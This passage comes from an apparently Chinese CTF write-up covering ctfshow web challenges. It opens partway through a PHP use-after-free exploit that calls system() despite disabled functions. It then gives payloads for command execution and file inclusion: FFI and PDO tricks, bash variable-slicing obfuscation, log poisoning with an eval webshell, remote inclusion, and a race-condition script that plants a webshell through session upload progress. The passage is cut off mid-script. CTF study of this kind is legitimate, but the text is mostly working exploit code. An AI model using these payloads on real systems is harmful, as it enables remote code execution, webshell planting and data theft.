class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get_binary_base</span><span class="params">($binary_leak)</span> &#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get_system</span><span class="params">($basic_funcs)</span> &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">trigger_uaf</span><span class="params">($arg)</span> &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>($abc) == <span class="number">79</span> || <span class="built_in">strlen</span>($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-73"><a href="#web-73" class="headerlink" title="web-73"></a>web-73</h3><p>可以重写strlen函数，用上面的脚本即可。</p>
<p>目录遍历再包含</p>
<p>c&#x3D;%3F%3E%3C%3Fphp%20%24a%3Dnew%20DirectoryIterator(%22glob%3A%2F%2F%2F*%22)%3B%0Aforeach(%24a%20as%20%24f)%0A%7Becho(%24f-%3E__toString().’%20’)%3B%0A%7D%0Aexit(0)%3B%0A%3F%3E%0A</p>
<p>c&#x3D;include(‘&#x2F;flagc.txt’);exit();</p>
<h3 id="web-74"><a href="#web-74" class="headerlink" title="web-74*"></a>web-74*</h3><p>老规矩，先扫目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</p>
<p>c&#x3D;include(‘&#x2F;flagx.txt’);exit();</p>
<p>可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flagx.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>

<p><em><strong>dbname可以是mysql，只要是mysql数据库里面存在的数据库名（dbname）就可以了</strong></em><br><em><strong>还要数据库密码是弱密码 root&#x2F;root</strong></em></p>
<h3 id="web-75"><a href="#web-75" class="headerlink" title="web-75"></a>web-75</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-</span><br><span class="line">&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;</span><br><span class="line">    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line"></span><br><span class="line">    foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">        echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure>

<h3 id="web-77"><a href="#web-77" class="headerlink" title="web-77*"></a>web-77*</h3><p>利用php7.4的FFI</p>
<p><em><strong>(PHP 7 &gt;&#x3D; 7.4.0, PHP 8)</strong></em><br><em><strong>FFI::cdef — Creates a new FFI object</strong></em><br><em><strong>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。</strong></em></p>
<p>通过FFI，可以实现调用system函数，从而执行命令<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a><br><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-</span><br><span class="line">&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);exit();</span><br></pre></td></tr></table></figure>

<p>将&#x2F;readflag的执行结果重定向到1.txt</p>
<h3 id="web-118"><a href="#web-118" class="headerlink" title="web-118*"></a>web-118*</h3><p>这里使用了linux系统变量构成命令来执行的方法</p>
<p>我们要构造nl命令来查看flag</p>
<p>看题目给的hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">假如</span><br><span class="line">$&#123;PATH&#125; 为abcdef</span><br><span class="line">那么</span><br><span class="line">$&#123;PATH:3&#125; def</span><br><span class="line">$&#123;PATH:~0&#125; f</span><br><span class="line">$&#123;PATH:~A&#125; f  //A是字符串转换为数字为0</span><br></pre></td></tr></table></figure>

<p>所以我们可以通过</p>
<p>${PATH:~A}构造出’n’ &#x2F;&#x2F;因为他把数字禁了</p>
<p>又因为${PWD}为当前目录</p>
<p>当前目录大概率为&#x2F;var&#x2F;www&#x2F;html</p>
<p>最后一个字符为l</p>
<p>所以可以构造出’l’</p>
<p>又因为hint中flag在flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">还有别的利用$&#123;PATH&#125;构造的payload</span><br><span class="line"></span><br><span class="line">SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$&#123;SHLVL&#125;=2。</span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;就输出/</span><br><span class="line"></span><br><span class="line">$&#123;#&#125;是0，$&#123;SHLVL&#125;为1</span><br><span class="line">$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是/root，$&#123;#PWD&#125;是5</span><br><span class="line"></span><br><span class="line">因为数字被屏蔽了，所以需要$&#123;#&#125;来替代数字，截取想要的字符串</span><br><span class="line"></span><br><span class="line">#$&#123;RANDOM&#125;是随机数，$&#123;#RANDOM&#125;一般是5，也可能是4</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br></pre></td></tr></table></figure>

<p>#其他师傅</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>

<h3 id="web-119"><a href="#web-119" class="headerlink" title="web-119"></a>web-119</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line"># pwd=/var/www/html</span><br><span class="line"># USER=www-data</span><br><span class="line"># payload即为 /???/?at ????.???</span><br><span class="line">为了构造/bin/cat </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">也可以只要a进行构造</span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure>

<h3 id="web-120"><a href="#web-120" class="headerlink" title="web-120"></a>web-120</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;*#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???*</span><br></pre></td></tr></table></figure>



<h3 id="web-121"><a href="#web-121" class="headerlink" title="web-121"></a>web-121</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span><br><span class="line">/???/r?? ????.???</span><br><span class="line">/bin/rev</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$&#123;?&#125;=0，$&#123;#?&#125;=1`($?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#IFS&#125;=3</span><br></pre></td></tr></table></figure>

<h3 id="web-122"><a href="#web-122" class="headerlink" title="web-122"></a>web-122</h3><p>通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误<br>payload:code&#x3D;&lt;A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???<br>#可能存在成功的机会，不断刷新(RANDOM可能是4或者5，上面有说过)，base64解码</p>
<h3 id="web-124"><a href="#web-124" class="headerlink" title="web-124*"></a>web-124*</h3><p>动态调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert  		#在任意进制之间转换数字。</span><br><span class="line">hexdec 			 #把十六进制转换为十进制。</span><br><span class="line">dechex 			#把十进制转换为十六进制。</span><br><span class="line">hex2bin  		#把十六进制的字符串转换为ASCII码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// 把 hex2bin转化为10进制</span><br><span class="line">echo base_convert(&quot;hex2bin&quot;, 36, 10);   //37907361743</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo base_convert(&quot;8d3746fcf&quot;, 16, 36);  //hex2bin</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//把_GET 先转为16进制再转为10进制</span><br><span class="line">echo hexdec(bin2hex(&quot;_GET&quot;));  //1598506324</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo base_convert(&quot;8d3746fcf&quot;, 16, 36)(dechex(&quot;1598506324&quot;));  // 绕过过滤拿到 &quot;_GET&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>简单解释一下吧，(dechex(“1598506324”))这东西解码后就是bin2hex(“_GET”)的内容，所以是一串ASCII码，base_convert(“8d3746fcf”, 10, 36)这玩意解码后就是hex2bin。所以全部解码之后就是bin2hex(bin2hex(“_GET”))，那它就是_GET了。我们将$$pi就是在GET里面套个GET方法，然后后面将数学函数套进去当作变量，system(要执行的命令)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$pi&#123;abs&#125;($$pi&#123;acos&#125;)  #相当于 $_GET[&#x27;abs&#x27;]($_GET[&#x27;acos&#x27;])</span><br></pre></td></tr></table></figure>

<p>大致就是这个意思。</p>
<p>c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&amp;abs&#x3D;system&amp;acos&#x3D;cat%20flag.php</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web-78"></a>web-78</h3><p>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-79"><a href="#web-79" class="headerlink" title="web-79"></a>web-79</h3><p>Php:&#x2F;&#x2F;input</p>
<?php system("cat flag.php");?>



<p>&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system('tac flag.???');?></p>
<p>&#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8&#x2F;Jyk7Pz4&#x3D;</p>
<h3 id="web-80"><a href="#web-80" class="headerlink" title="web-80*"></a>web-80*</h3><p>php:&#x2F;&#x2F;input大小写绕过</p>
<p>&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>User-Agent: <?php eval($_POST[1]);?></p>
<p>1&#x3D;system(‘ls’);</p>
<p>1&#x3D;system(‘cat fl0g.php’);</p>
<p>?file&#x3D;<a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/daigua.txt">http://xxx.xxx.xxx.xxx/daigua.txt</a><br>daigua.txt里面写入代码。</p>
<h3 id="web-82"><a href="#web-82" class="headerlink" title="web-82*"></a>web-82*</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了点，日志包含也不行了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PHP里面唯一我们能控制的没有后缀的文件就是session文件</span><br><span class="line"></span><br><span class="line">利用PHP_SESSION_UPLOAD_PROGRESS写入session文件加条件竞争达到文件包含的目的</span><br><span class="line"></span><br><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on（默认开启）</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;（默认）</span><br><span class="line">4. session.upload_progress.name = &quot;$PHP_SESSION_UPLOAD_PROGRESS&quot;（默认）</span><br><span class="line"></span><br><span class="line">enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line"></span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容</span><br><span class="line"></span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控也就是PHP_SESSION_UPLOAD_PROGRESS的值可控；</span><br><span class="line"></span><br><span class="line">prefix+name将表示为session中的键名，</span><br></pre></td></tr></table></figure>

<blockquote>
<p>大体思路为：</p>
<p>1、post一个与ini中设置的session.upload_progress.name的同名变量（默认的name为“PHP_SESSION_UPLOAD_PROGRESS”），那么就会返回上传文件的实时进度并写入session文件中。session文件的内容为:（它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值）</p>
<p>2、如果我们post传递PHP_SESSION_UPLOAD_PROGRESS的值为一句话木马</p>
<p>比如为：<?php system('ls');?></p>
<p>3、同时，我们在cookie里面设置名字：PHPSESSID，值：flag，（目的是设置session文件，因为这样我们才能知道实时进度（一句话木马）上传到哪里了）；那么在&#x2F;tem&#x2F;sess_flag这个文件的内容就为upload_progress_<?php system('ls')?>。然后在include（&#x2F;tem&#x2F;sess_flag）就会执行后面的php代码从而成功执行rce。</p>
<p>4、虽然文件上传结束后，php会清空session文件中的内容，但是如果我们边上传边去访问&#x2F;tem&#x2F;sess_aaa进行条件竞争，那么就有可能在删除session文件前访问到这个文件。</p>
</blockquote>
<p>我们能够创建session文件的原因：session里有一个默认选项，session.use_strict_mode默认值为off。也就是说此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;aaa，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_aaa”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。这个键值ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_aaa文件里。<br>但是<strong>session.upload_progress.cleanup</strong>默认是开启的，一旦读取了所有POST数据，它就会清除进度信息，把我们session文件里的内容全部删除。所以这里我们需要利用条件竞争来读取session文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://26bfc8ed-f28a-46ef-94a6-bbff5bb92e6b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>抓包，文件名称改为PHP_SESSION_UPLOAD_PROGRESS，PHPSESID改一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#-- coding:UTF-8 --</span><br><span class="line"> </span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">url = &#x27;http://616ed007-24be-4e42-9bc8-7fcbc8bfd49c.challenge.ctf.show/&#x27;</span><br><span class="line">sessionid=&#x27;ctfshow&#x27;</span><br><span class="line">data=&#123;</span><br><span class="line">    &quot;1&quot;:&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">def write(session):</span><br><span class="line">    fileBytes=io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">    while True:</span><br><span class="line">        response=session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;</span><br><span class="line">                &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                